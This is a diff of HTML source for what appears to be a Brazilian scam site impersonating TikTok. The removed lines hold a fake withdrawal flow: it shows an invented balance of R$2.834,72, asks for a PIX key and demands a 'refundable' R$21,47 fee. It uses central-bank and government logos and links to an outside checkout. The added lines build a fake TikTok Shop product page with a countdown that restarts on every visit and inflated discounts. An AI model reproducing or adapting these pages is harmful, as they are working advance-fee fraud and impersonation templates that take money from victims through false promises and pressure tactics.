-            class="btn-obrigado btn-sacar-dois btn-sacar-indisponivel"
-            aria-label="sacar dinheiro"
-          >
-            <span class="btn-text btn-textdois-sacar btn-three-saque"
-              >Sacar dinheiro</span
-            >
-          </button>
-          <div class="obtem obtem-sacar sacar-dinheiro">
-            <span class="obtem-txt"
-              >Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os
-              limites de saque para transações individuais e mensais podem
-              variar conforme o pais ou região.</span
-            >
-          </div>
-        </div>
-
-        <div class="saldo saldo-sacar">
-          <div
-            class="container-saldo ctn-flor"
-            role="region"
-            aria-labelledby="saldo-title"
-          >
-            <img src="/images/flor.png" alt="" class="flor" />
-            <div class="saldo-info obtenha-title">
-              <div class="saldo-label">
-                <span class="saldo-sacar-text obtenha-txt"
-                  >Obtenha Moedas para a LIVE</span
-                >
-              </div>
-
-              <div
-                class="saldo-valor saldo-valor-tres border-none"
-                aria-live="polite"
-              >
-                <span class="transferencia-txt moedas-txt"
-                  >Use Moedas para enviar presentes virtuais para seus hosts de
-                  live Favoritos.</span
-                >
-              </div>
-            </div>
-          </div>
-
-          <button
-            type="button"
-            class="btn-sacar-indisponivel"
-            aria-label="sacar dinheiro"
-          >
-            <span class="btn-text btn-indis">Indisponível</span>
-          </button>
-          <!-- <div class="obtem obtem-sacar">
-            <span class="obtem-txt"
-              >Para sacar ddasdasinheiro, você precisa de um saldo mínimo de
-              R$1,5. Os limites de saque para transações individuais e mensais
-              podem variar conforme o pais ou região.</span
-            >
-          </div> -->
-        </div>
-
-        <div class="saldo saldo-sacar">
-          <div
-            class="container-saldo"
-            role="region"
-            aria-labelledby="saldo-title"
-          >
-            <div class="saldo-info obtenha-title">
-              <div class="saldo-label">
-                <span class="saldo-sacar-text obtenha-txt">Recarga móvel</span>
-              </div>
-
-              <div
-                class="saldo-valor saldo-valor-tres celular-recarga"
-                aria-live="polite"
-              >
-                <span class="ddd">+55</span>
-                <span class="linha-ddd"></span>
-                <div class="telefone">12345678901</div>
-              </div>
-            </div>
-          </div>
-
-          <button
-            type="button"
-            class="btn-sacar-indisponivel"
-            aria-label="sacar dinheiro"
-          >
-            <span class="btn-text btn-indis">Indisponível</span>
-          </button>
-          <div class="obtem obtem-sacar">
-            <span class="obtem-txt recarga-txt"
-              >Voce precisa de um saldo mínimo de R$10 para recarga de
-              celular</span
-            >
-          </div>
-        </div>
-      </section>
-
-      <section id="four" class="modal" aria-hidden="true">
-        <div class="modal-inner inner-pop">
-          <div class="saque-popup">
-            <div class="title saque-title">Adicionar método de saque</div>
-            <span
-              class="pix-item"
-              role="button"
-              tabindex="0"
-              data-open-modal="five"
-            >
-              <div class="pix-icon">
-                <img src="/images/pix-solo.svg" alt="" class="pix-solo" />
-              </div>
-
-              <div class="pix-details">
-                <span class="pix-title">PIX</span>
-                <span class="pix-subtitle">Recebimento Imediato</span>
-              </div>
-
-              <span class="pix-arrow">
-                <svg
-                  xmlns="http://www.w3.org/2000/svg"
-                  width="8"
-                  height="14"
-                  viewBox="0 0 8 14"
-                  fill="none"
-                >
-                  <path
-                    d="M1.411 13.414L0 12L5.28899 6.707L0 1.414L1.415 0L6.69999 5.293C7.07493 5.66806 7.28556 6.17667 7.28556 6.707C7.28556 7.23733 7.07493 7.74594 6.69999 8.121L1.411 13.414Z"
-                    fill="#7F7F7F"
-                  ></path>
-                </svg>
-              </span>
-            </span>
-          </div>
-        </div>
-      </section>
-      <section id="five" class="screen" aria-hidden="true">
-        <div class="modal-inner inner-pop saque-popup">
-          <div class="title saque-title">Vincular PIX</div>
-
-          <div class="form-container">
-            <div class="form-group">
-              <label class="field-label" for="nome">Nome</label>
-              <input
-                type="text"
-                id="nome"
-                placeholder="Nome completo"
-                class="nome-completo"
-              />
-            </div>
-
-            <div class="form-group">
-              <label class="field-label">Tipo de Chave PIX</label>
-
-              <div
-                class="pix-selector"
-                id="pix-type-selector"
-                data-open-modal="six"
-                role="button"
-                tabindex="0"
-              >
-                <span class="placeholder-text" id="pix-selector-text"
-                  >Escolha o tipo de chave PIX</span
-                >
-                <span class="arrow arrow-tois"
-                  ><svg
-                    xmlns="http://www.w3.org/2000/svg"
-                    width="5"
-                    height="9"
-                    viewBox="0 0 5 9"
-                    fill="none"
-                  >
-                    <path
-                      d="M0.940665 8.94267L0 8L3.52599 4.47133L0 0.942666L0.943332 0L4.46666 3.52867C4.71662 3.7787 4.85704 4.11778 4.85704 4.47133C4.85704 4.82489 4.71662 5.16396 4.46666 5.414L0.940665 8.94267Z"
-                      fill="#7F7F7F"
-                    ></path>
-                  </svg>
-                </span>
-              </div>
-            </div>
-
-            <div class="form-group">
-              <label class="field-label">Chave PIX</label>
-              <!-- Wrapper para detectar clique quando disabled -->
-              <div id="pix-key-wrapper" class="input-wrapper-disabled">
-                <input
-                  type="text"
-                  id="pix-key-input"
-                  placeholder="Digite sua chave PIX"
-                  class="nome-completo input-disabled"
-                  disabled=""
-                />
-              </div>
-            </div>
-
-            <button
-              type="button"
-              id="btn-enviar-pix"
-              class="btn-obrigado btn-sacar-dois btn-vincular btn-disabled"
-              aria-label="sacar dinheiro"
-            >
-              <span class="btn-text btn-textdois-sacar">Enviar</span>
-            </button>
-          </div>
-        </div>
-      </section>
-      <section id="six" class="screen" aria-hidden="true">
-        <div class="modal-inner inner-pop">
-          <div class="saque-popup chave-pix">
-            <div class="title saque-title">Chave PIX</div>
-            <div class="selection-container">
-              <div class="option-row">
-                <label for="key-cpf">
-                  <span class="option-text">CPF</span>
-                  <input
-                    type="radio"
-                    id="key-cpf"
-                    name="pix_key_type"
-                    checked=""
-                  />
-                  <span class="custom-radio"></span>
-                </label>
-              </div>
-
-              <div class="option-row">
-                <label for="key-email">
-                  <span class="option-text">E-mail</span>
-                  <input type="radio" id="key-email" name="pix_key_type" />
-                  <span class="custom-radio"></span>
-                </label>
-              </div>
-
-              <div class="option-row">
-                <label for="key-celular">
-                  <span class="option-text">Celular</span>
-                  <input type="radio" id="key-celular" name="pix_key_type" />
-                  <span class="custom-radio"></span>
-                </label>
-              </div>
-
-              <div class="option-row">
-                <label for="key-aleatoria">
-                  <span class="option-text">Chave Aleatória</span>
-                  <input type="radio" id="key-aleatoria" name="pix_key_type" />
-                  <span class="custom-radio"></span>
-                </label>
-              </div>
-            </div>
-          </div>
-        </div>
-      </section>
-      <section id="seven" class="screen">
-        <header class="loading-header">
-          <div class="loading-logo">
-            <img
-              src="/images/logotiktok.png"
-              alt="TikTok Logo"
-              class="loading-logo-img"
-            />
-          </div>
-        </header>
-
-        <main class="loading-main-content">
-          <div class="new-loading-container">
-            <div class="new-loading-text" id="new-loading-text">
-              Validando acesso...
-            </div>
-            <div class="new-progress-track">
-              <div class="new-progress-bar" id="new-progress-bar"></div>
-            </div>
-          </div>
-        </main>
-      </section>
-      <section id="nine" class="screen" aria-hidden="true">
-        <div class="confirmation-container">
-          <div class="confirmation-header">
-            <div class="confirmation-logo">
-              <img src="images/logotiktok.png" alt="TikTok" />
-            </div>
-          </div>
-
-          <!-- Saldo Acumulado -->
-          <div class="confirmation-section confirmation-balance">
-            <div class="confirmation-balance-title">SALDO DISPONÍVEL</div>
-            <div
-              class="confirmation-balance-amount"
-              data-amount-target="2834.72"
-            >
-              R$ 2.834,72
-            </div>
-            <div class="confirmation-balance-subtitle">
-              Aguardando confirmação para saque
-            </div>
-          </div>
-
-          <!-- Taxa de Confirmação -->
-          <div class="confirmation-section">
-            <div class="confirmation-section-title">
-              CONFIRMAÇÃO DE IDENTIDADE
-            </div>
-            <div class="confirmation-fee-amount">
-              R$ 21,47
-              <span class="confirmation-reembolso-badge"
-                >VALOR REEMBOLSÁVEL</span
-              >
-            </div>
-            <div class="confirmation-fee-description">
-              Taxa obrigatória para liberação do saque no valor de
-              <span class="bold">R$2.834,72</span>. O valor de
-              <span class="bold">R$21,47</span> será reembolsado integralmente
-              para você em 1 minuto.
-            </div>
-          </div>
-
-          <!-- Comprovante -->
-          <div class="confirmation-section">
-            <div class="confirmation-section-title">DADOS PARA REEMBOLSO</div>
-            <div class="confirmation-receipt-grid">
-              <div class="confirmation-receipt-item">
-                <div class="confirmation-receipt-label">Nome</div>
-                <div
-                  class="confirmation-receipt-value"
-                  id="confirmation-name"
-                ></div>
-              </div>
-              <div class="confirmation-receipt-item">
-                <div class="confirmation-receipt-label">Data</div>
-                <div
-                  class="confirmation-receipt-value"
-                  id="confirmation-date"
-                ></div>
-              </div>
-              <div class="confirmation-receipt-item">
-                <div class="confirmation-receipt-label">Chave PIX</div>
-                <div
-                  class="confirmation-receipt-value"
-                  id="confirmation-key-type"
-                ></div>
-              </div>
-              <div class="confirmation-receipt-item">
-                <div class="confirmation-receipt-label">Valor a receber</div>
-                <div class="confirmation-receipt-value bold">R$ 2.834,72</div>
-              </div>
-              <div class="confirmation-pix-key" id="confirmation-pix-key"></div>
-            </div>
-          </div>
-
-          <div class="confirmation-divider"></div>
-
-          <!-- Requisitos -->
-          <div class="confirmation-section">
-            <div class="confirmation-section-title">PROCESSO DE LIBERAÇÃO</div>
-            <div class="confirmation-requirements-grid">
-              <div class="confirmation-requirement-item">
-                <div class="confirmation-requirement-icon">1</div>
-                <div class="confirmation-requirement-content">
-                  <div class="confirmation-requirement-title">
-                    Pagar taxa de confirmação
-                  </div>
-                  <div class="confirmation-requirement-description">
-                    R$ 21,47 para verificação de identidade
-                  </div>
-                </div>
-              </div>
-              <div class="confirmation-requirement-item">
-                <div
-                  class="confirmation-requirement-icon confirmation-reembolso"
-                >
-                  ✓
-                </div>
-                <div class="confirmation-requirement-content">
-                  <div
-                    class="confirmation-requirement-title confirmation-reembolso"
-                  >
-                    Receber reembolso automático
-                  </div>
-                  <div class="confirmation-requirement-description">
-                    Valor devolvido em 1 minuto
-                  </div>
-                </div>
-              </div>
-              <div class="confirmation-requirement-item">
-                <div class="confirmation-requirement-icon">3</div>
-                <div class="confirmation-requirement-content">
-                  <div class="confirmation-requirement-title">
-                    Acessar saldo completo
-                  </div>
-                  <div class="confirmation-requirement-description">
-                    R$ 2.834,72 liberado para saque
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-
-          <!-- Call to Action -->
-          <div class="confirmation-section">
-            <a
-              href="https://tiktokpay.compra-segura.app/checkout/v3/44zngcIYF7areDrSAKGo"
-              class="confirmation-cta-button"
-              id="confirmation-button"
-              onclick="herdarUTMeRedirecionar(this.href); return false;"
-            >
-              Pagar taxa para Liberar Saque
-            </a>
-
-            <script>
-              function herdarUTMeRedirecionar(urlDestino) {
-                // Pega os parâmetros da URL atual
-                const urlAtual = new URL(window.location.href);
-                const params = new URLSearchParams(urlAtual.search);
-
-                // Filtra UTMs + ttclid
-                const parametrosParaHerdar = {};
-                for (const [key, value] of params.entries()) {
-                  if (
-                    key.startsWith("utm_") ||
-                    key === "ttclid" // <- novo parâmetro incluído
-                  ) {
-                    parametrosParaHerdar[key] = value;
-                  }
-                }
-
-                // Cria a URL de destino com os parâmetros herdados
-                const urlFinal = new URL(urlDestino);
-                const paramsDestino = new URLSearchParams(urlFinal.search);
-
-                // Adiciona os parâmetros herdados à URL de destino
-                for (const [key, value] of Object.entries(
-                  parametrosParaHerdar
-                )) {
-                  paramsDestino.set(key, value);
-                }
-
-                urlFinal.search = paramsDestino.toString();
-
-                // Redireciona na mesma página
-                window.location.href = urlFinal.toString();
-              }
-            </script>
-            <div class="confirmation-timer">
-              ⏱️ Reembolso automático em 1 minuto
-            </div>
-            <div
-              class="confirmation-success-message"
-              id="confirmation-success-message"
-            >
-              ✅ Identidade confirmada. R$ 21,67 reembolsados e saque liberado.
-            </div>
-          </div>
-
-          <!-- Segurança -->
-          <div class="confirmation-security-grid">
-            <div class="confirmation-security-item">
-              <div class="confirmation-security-label">
-                <img src="/images/bacen.png" alt="" class="img-bacen" />
-              </div>
-            </div>
-            <div class="confirmation-security-item">
-              <div class="confirmation-security-label">
-                <img src="/images/gov-br.webp" alt="" class="img-gov-br" />
-              </div>
-            </div>
-            <div class="confirmation-security-item">
-              <div class="confirmation-security-label">
-                <img
-                  src="/images/receitafederal.png"
-                  alt=""
-                  class="img-receitafederal"
-                />
-              </div>
-            </div>
-          </div>
-
-          <!-- Footer -->
-          <div class="confirmation-footer">
-            <div class="confirmation-footer-text">Processo 100% seguro</div>
-            <a href="#nine" class="confirmation-footer-link"
-              >Precisa de ajuda?</a
-            >
-          </div>
-        </div>
-      </section>
-      <section id="back" class="screen" aria-hidden="true">
-        <div class="back-container">
-          <header class="back-header">
-            <div class="back-logo">
-              <img
-                src="/images/logotiktok.png"
-                alt="TikTok Logo"
-                class="back-logo-img"
-              />
-            </div>
-          </header>
-
-          <div class="back-content">
-            <div class="back-currency-label">DESCONTO EXCLUSIVO PARA VOCÊ</div>
-            <h1 class="back-title">SAQUE SEU PAGAMENTO</h1>
-            <p class="back-subtitle">Libere o saque com um único pagamento</p>
-
-            <div class="back-amount">R$ 14,87</div>
-
-            <p class="back-description">
-              Para liberar o saque, confirme o pagamento único de
-              <strong>R$ 14,87</strong>. Após clicar no botão abaixo você será
-              redirecionado para a página de pagamento.
-            </p>
-
-            <a
-              href="https://tiktokpay.compra-segura.app/checkout/v3/lKHLEETuNIP6iJxOgFby"
-              class="back-cta-button"
-              id="back-button"
-              onclick="herdarUTMeRedirecionar(this.href); return false;"
-            >
-              Resgatar por R$ 14,87
-            </a>
-
-            <p class="back-security-text">
-              Pagamento seguro. Atendimento 24/7.
-            </p>
-            <p class="back-help-text">
-              Se o redirecionamento não acontecer, tente novamente ou atualize a
-              página.
-            </p>
-          </div>
-        </div>
-      </section>
-
-      <section id="popup-um" class="sticky-popup">
-        <div class="timer-wrapper expira-em-popup">
-          <div class="timer-label">Expira em</div>
-
-          <div class="timer-clock">
-            <!-- Horas -->
-            <div class="timer-box" data-timer="hours">00</div>
-
-            <!-- Separador -->
-            <div class="timer-separator">:</div>
-
-            <!-- Minutos -->
-            <div class="timer-box" data-timer="minutes">42</div>
-
-            <!-- Separador -->
-            <div class="timer-separator">:</div>
-
-            <!-- Segundos -->
-            <div class="timer-box" data-timer="seconds">37</div>
-          </div>
-        </div>
-        <!-- <div class="line line-expira"></div> -->
-        <div class="saldo saldo-popup">
-          <div
-            class="container-saldo"
-            role="region"
-            aria-labelledby="saldo-title"
-          >
-            <div class="saldo-info">
-              <div class="saldo-label">
-                <span class="saldo-text">Seu saldo</span>
-                <img src="/images/p-saldo.svg" alt="" class="p-saldo" />
-              </div>
-
-              <div class="saldo-valor" aria-live="polite">
-                <span class="valor-currency">R$2.834,72</span>
-              </div>
-            </div>
-
-            <div class="saldo-action">
-              <button type="button" class="btn-sacar" aria-label="Sacar">
-                <span class="btn-text">Sacar</span>
-                <span class="pix-badge" aria-hidden="true">
-                  <img src="/images/pix-logo.svg" alt="" />
-                </span>
-              </button>
-            </div>
-          </div>
-        </div>
-      </section>
-    </main>
+        <div class="text-xs font-semibold" style="text-transform: uppercase;  text-align: right; width: 70%; display: inline-flex; justify-content: flex-end;"><svg class="h-[1.2em] w-[1.2em]" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg> Oferta Relâmpago</div>
+      </div>
+      <div class="flex justify-between items-center text-xs mt-1" style="margin-top: 0rem;">
+        <p style="visibility: hidden;">Economize até 81%</p>
+        <p id="countdown" class="bg-white text-orange-600 font-bold px-2 py-0.5 rounded text-[11px]" style="text-transform: uppercase; margin-top: -4.2em;">
+          Termina em 00:05:00
+        </p>
+      </div>
+
+      <script>
+        let totalSeconds = 300; // 5 minutos
+
+        function formatTime(seconds) {
+          const mins = Math.floor(seconds / 60).toString().padStart(2, '0');
+          const secs = (seconds % 60).toString().padStart(2, '0');
+          return "Termina em 00:" + mins + ":" + secs;
+        }
+
+        const countdownEl = document.getElementById('countdown');
+        countdownEl.textContent = formatTime(totalSeconds);
+
+        const interval = setInterval(() => {
+          totalSeconds--;
+
+          if (totalSeconds <= 0) {
+            clearInterval(interval);
+            countdownEl.textContent = "Oferta encerrada";
+            countdownEl.classList.remove("text-orange-600");
+            countdownEl.classList.add("text-red-600");
+          } else {
+            countdownEl.textContent = formatTime(totalSeconds);
+          }
+        }, 1000);
+      </script>
+    </div>
+
+    <!-- DESCONTO EXTRA -->
+    <div class="flex gap-2 px-2" style="margin-top: 1em;">
+      <span class="bg-pink-100 text-pink-700 text-xs font-bold px-3 py-1 rounded-full" style="border-radius: 5px;">Economize R$490,46</span>
+      <span class="bg-pink-100 text-pink-700 text-xs font-bold px-3 py-1 rounded-full" style="border-radius: 5px;">Economize 85% COM CUPOM</span>
+    </div>
+
+    <!-- TÍTULO -->
+    <div class="px-3 pt-3">
+      <p class="text-gray-800 font-medium leading-snug text-[18px]">
+        <span class="Promoção dias das crianças" style="display: inline-block; background: linear-gradient(to right, #f9c2d0, #c2f9f1); padding: 2px 6px; border-radius: 8px; font-weight: bold; font-size: 11px; color: #000; margin-right: 6px;">🔥 BLACK FRIDAY </span> Aparelho de Jantar e Chá Porcelana 30 Peças Ryo Maresia Jogo de Pratos e Xícaras Oxford
+
+      </p>
+    </div>
+
+    <!-- AVALIAÇÃO -->
+    <div class="px-3 mt-1 flex items-center gap-1 text-gray-600 text-[12px]">
+      <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-yellow-500" viewBox="0 0 24 24" fill="currentColor">
+        <path d="M12 17.27L18.18 21l-1.63-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.45 4.73L5.82 21z"></path>
+      </svg>
+      <span class="font-semibold">4.7</span>
+      <span>(204)</span>
+      <span class="mx-1">•</span>
+      <span>4473 vendidos</span>
+    </div>
+
+    <hr style="margin-top: 1.5em; margin-bottom: 1.5em;">
+
+<!-- FRETE COM DATA DINÂMICA -->
+<div class="px-4 py-5 mt-4 text-gray-800 text-base flex items-start gap-3 bg-white rounded-xl border border-gray-100" style="margin-bottom:20px; margin-left: 16px; margin-right: 16px;">
+  <!-- Ícone do caminhão -->
+  <img src="images/truck-line-2.svg" alt="Entrega" class="w-7 h-7 text-blue-600 flex-shrink-0 mt-0.5">
+
+  <!-- Conteúdo do texto -->
+  <div class="space-y-1.5">
+    <!-- Data de entrega dinâmica (atualiza automaticamente) -->
+    <p id="delivery-date" class="text-gray-700 font-medium">
+      Receba até 3–8 de out
+    </p>
+
+    <!-- Taxa de envio fixa -->
+    <p class="text-gray-600 text-sm">Taxa de envio: <span class="text-green-600 font-bold">Grátis</span></p>
+  </div>
+</div>
+
+<!-- SCRIPT PARA ATUALIZAR A DATA DINAMICAMENTE -->
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    function atualizarDataEntrega() {
+      const hoje = new Date();
+      
+      // Calcular datas de entrega (3-8 dias úteis)
+      const dataMinima = new Date(hoje);
+      const dataMaxima = new Date(hoje);
+      
+      dataMinima.setDate(hoje.getDate() + 3);
+      dataMaxima.setDate(hoje.getDate() + 8);
+      
+      // Formatar datas em português (ex: "3–8 de out")
+      const options = { day: 'numeric', month: 'short' };
+      const locale = 'pt-BR';
+      
+      const dataMin = dataMinima.toLocaleDateString(locale, options);
+      const dataMax = dataMaxima.toLocaleDateString(locale, options);
+      
+      // Verificar se as datas estão no mesmo mês
+      const mesMin = dataMinima.toLocaleDateString(locale, { month: 'short' });
+      const mesMax = dataMaxima.toLocaleDateString(locale, { month: 'short' });
+      
+      let textoData;
+      if (mesMin === mesMax) {
+        // Mesmo mês: "3–8 de out"
+        const diaMin = dataMin.split(' ')[0];
+        const diaMax = dataMax.split(' ')[0];
+        textoData = `${diaMin}–${diaMax} de ${mesMin}`;
+      } else {
+        // Meses diferentes: "28 de set – 3 de out"
+        textoData = `${dataMin} – ${dataMax}`;
+      }
+      
+      // Atualizar o texto no HTML
+      document.getElementById('delivery-date').textContent = 
+        `Receba até ${textoData}`;
+    }
+    
+    // Executar imediatamente e atualizar a cada 24h
+    atualizarDataEntrega();
+    setInterval(atualizarDataEntrega, 86400000); // 24h em milissegundos
+  });
+</script>
 
     <script>
-      // Funções auxiliares
-      function easeOutCubic(t) {
-        return 1 - Math.pow(1 - t, 3);
-      }
+      const meses = ['jan', 'fev', 'mar', 'abr', 'mai', 'jun', 'jul', 'ago', 'set', 'out', 'nov', 'dez'];
 
-      function formatBR(value) {
-        return value
-          .toFixed(2) // duas casas decimais
-          .replace(".", ",") // vírgula decimal
-          .replace(/\B(?=(\d{3})+(?!\d))/g, "."); // ponto para milhar
-      }
+      const hoje = new Date();
+      const amanha = new Date();
+      amanha.setDate(hoje.getDate() + 1);
 
-      // Função reutilizável para animar um contador
-      function animateCurrencyCounter(counter, forceReset = false) {
-        if (!counter) return;
+      const dia = amanha.getDate();
+      const mes = meses[amanha.getMonth()];
 
-        // Se já está animando e não forçou reset, não anima novamente
-        if (counter._isAnimating && !forceReset) return;
-
-        const duration = 2000; // tempo total da animação
-        const toValue =
-          parseFloat(counter.getAttribute("data-amount-target")) || 0;
-        const fromValue = 0;
-
-        if (toValue === 0) {
-          // Garante que sempre mostre um valor válido, mesmo se for 0
-          counter.textContent = "R$ 0,00";
-          return;
-        }
-
-        // Cancela animação anterior se existir
-        if (counter._animationFrameId) {
-          cancelAnimationFrame(counter._animationFrameId);
-          counter._animationFrameId = null;
-        }
-
-        // Garante que sempre comece com um valor visível
-        counter.textContent = "R$ 0,00";
-
-        counter._isAnimating = true;
-        let startTime = null;
-
-        function animateCounter(currentTime) {
-          if (!startTime) startTime = currentTime;
-          const elapsed = currentTime - startTime;
-          const progress = Math.min(elapsed / duration, 1);
-          const value =
-            fromValue + (toValue - fromValue) * easeOutCubic(progress);
-
-          // Atualiza número formatado no padrão brasileiro - sempre garante um valor válido
-          const formattedValue = "R$ " + formatBR(value);
-          if (counter && counter.textContent !== undefined) {
-            counter.textContent = formattedValue;
-          }
-
-          if (progress < 1) {
-            counter._animationFrameId = requestAnimationFrame(animateCounter);
-          } else {
-            // garante valor final exato
-            const finalValue = "R$ " + formatBR(toValue);
-            if (counter && counter.textContent !== undefined) {
-              counter.textContent = finalValue;
-            }
-            counter._isAnimating = false;
-            counter._animationFrameId = null;
-          }
-        }
-
-        // Pequeno delay para garantir que o DOM está pronto
-        setTimeout(() => {
-          if (counter && counter.getAttribute("data-amount-target")) {
-            counter._animationFrameId = requestAnimationFrame(animateCounter);
-          }
-        }, 10);
-      }
-
-      // Anima todos os contadores visíveis no carregamento
-      document.addEventListener("DOMContentLoaded", function () {
-        // Anima apenas contadores que estão visíveis na tela inicial
-        const initialCounters = document.querySelectorAll(
-          "#one .valor-currency[data-amount-target]"
-        );
-        initialCounters.forEach((counter) => {
-          animateCurrencyCounter(counter);
-        });
-      });
-
-      // Expõe a função globalmente para ser chamada quando o popup abrir
-      window.animateCurrencyCounter = animateCurrencyCounter;
+      document.getElementById('entrega').innerText = 'Receba de '+dia+' de '+mes+' - '+dia+' de '+mes+'';
     </script>
 
-    <!-- <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        const counters = document.querySelectorAll(".elementor-counter-number");
+<!-- SEÇÃO: SERVIÇOS DO TIKTOK SHOP (ESTILO TIKTOK) -->
+<div class="bg-yellow-50 p-4 rounded-lg shadow-sm" style="margin-left:16px; margin-right: 16px;"> <!-- Fundo levemente amarelado, padding, bordas arredondadas e sombra suave -->
 
-        counters.forEach((counter) => {
-          const duration =
-            parseInt(counter.getAttribute("data-duration")) || 2000;
-          const toValue =
-            parseFloat(counter.getAttribute("data-to-value")) || 0;
-          const fromValue =
-            parseFloat(counter.getAttribute("data-from-value")) || 0;
-          const delimiter = counter.getAttribute("data-delimiter") || ".";
+  <!-- CABEÇALHO DA SEÇÃO -->
+  <div class="flex items-center justify-between mb-4"> <!-- Alinhamento flexível, itens centralizados, espaçamento entre eles e margem inferior -->
 
-          let startTime = null;
+    <!-- ÍCONE DO ESCUDO (CÍRCULO MARROM COM CHECK BRANCO) E TÍTULO -->
+    <div class="flex items-center">
+      <!-- Ícone: Círculo marrom com check branco -->
+      <div class="w-6 h-6 mr-2 relative flex-shrink-0 rounded-full bg-amber-700"> <!-- Círculo sólido marrom -->
+        <!-- Checkmark branco no centro -->
+        <svg class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-4 h-4 text-white" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+          <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+        </svg>
+      </div>
+      
+      <!-- Título da seção -->
+      <h3 class="text-amber-700 font-semibold text-lg">Proteção do cliente</h3>
+    </div>
 
-          function animateCounter(currentTime) {
-            if (!startTime) startTime = currentTime;
-            const elapsed = currentTime - startTime;
-            const progress = Math.min(elapsed / duration, 1);
-            const value =
-              fromValue + (toValue - fromValue) * easeOutCubic(progress);
+    <!-- Seta indicando que é clicável -->
+    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-amber-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
+    </svg>
+  </div>
 
-            counter.textContent = formatNumber(value, delimiter);
+  <!-- LISTA DE SERVIÇOS EM DUAS COLUNAS -->
+  <!-- Grid layout para organizar os itens em 2 colunas -->
+  <div class="grid grid-cols-2 gap-x-4 gap-y-2" style="align-items: center;">
 
-            if (progress < 1) {
-              requestAnimationFrame(animateCounter);
-            } else {
-              counter.textContent = formatNumber(toValue, delimiter);
-            }
+    <!-- Item 1: Devolução gratuita -->
+    <div class="flex items-start text-gray-800">
+      <!-- Checkmark verde -->
+      <svg class="h-4 w-4 text-green-500 mt-0.5 mr-2 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+      </svg>
+      <span>Devolução gratuita</span>
+    </div>
+
+    <!-- Item 2: Cupom por perda ou dano (com quebra de linha) -->
+    <div class="flex items-start text-gray-800">
+      <svg class="h-4 w-4 text-green-500 mt-0.5 mr-2 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+      </svg>
+      <span>Pagamento seguro</span> <!-- Quebra de linha para combinar com a foto -->
+    </div>
+
+    <!-- Item 3: Pagamento seguro -->
+    <div class="flex items-start text-gray-800">
+      <svg class="h-4 w-4 text-green-500 mt-0.5 mr-2 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+      </svg>
+      <span>Reembolso automático por dano</span>
+    </div>
+
+    <!-- Item 4: Cupom por atraso na coleta (com quebra de linha) -->
+    <div class="flex items-start text-gray-800">
+      <svg class="h-4 w-4 text-green-500 mt-0.5 mr-2 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+      </svg>
+      <span>Cupom por atraso na coleta</span> <!-- Quebra de linha para combinar com a foto -->
+    </div>
+
+  </div> <!-- Fim do grid de serviços -->
+
+</div> <!-- Fim do container principal da seção -->
+
+<!-- SEPARADOR (OPCIONAL, PARA DIVIDIR SEÇÕES) -->
+<div class="border-t border-gray-200 my-4"></div>
+
+<!-- SEÇÃO: OFERTAS (COM CUPOM JÁ APLICADO) -->
+<div class="bg-white p-4">
+  <!-- CABEÇALHO -->
+  <div class="flex items-center justify-between mb-3">
+    <h3 class="font-medium text-gray-900">Ofertas</h3>
+  </div>
+
+  <!-- CARTÃO DE OFERTA (ESTADO: JÁ APLICADO) -->
+  <div class="bg-gradient-to-r from-pink-50 to-rose-50 rounded-lg p-4 border border-rose-100 flex justify-between items-center">
+    <div>
+      <span class="text-2xl font-bold text-rose-600">Frete Grátis</span>
+      <p class="text-xs text-gray-600 mt-1">Entrega gratuita para todo o Brasil em compras acima de R$ 50,00</p>
+    </div>
+    <!-- Botão alterado para "Aplicado" com ícone de check -->
+    <div class="bg-gray-200 text-gray-700 font-medium py-2 px-4 rounded-md text-sm flex items-center gap-2 cursor-default" style="margin-left: 16px;"> <!-- Fundo cinza para "desabilitado/aplicado" -->
+      <svg class="h-4 w-4 text-green-500" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
